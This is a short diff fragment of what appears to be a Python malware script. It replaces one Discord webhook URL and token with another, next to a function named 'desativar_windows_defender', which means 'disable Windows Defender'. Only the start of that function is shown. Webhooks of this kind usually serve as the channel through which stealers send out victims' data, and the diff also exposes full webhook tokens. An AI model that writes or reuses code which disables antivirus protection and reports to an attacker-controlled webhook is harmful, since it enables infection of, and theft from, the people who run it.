@@ -9,7 +9,7 @@ import os
 import shutil
 from datetime import datetime
 
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1544336526878707832/CTQ9dLKO41bbjQ-sqbw4VwqM0y0zwsbW2lNHGf-D9YgxH7bX2Kd7PESxYoNSbx1RsVbp"
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1545534108178972692/KE8QMZAPw57EPlyE7oJQGwYk4fVO3oR73K41Rt2hTDoVFT7pCOOeA8qs1GKmhur1LsHd"
 
 def desativar_windows_defender():
     try:
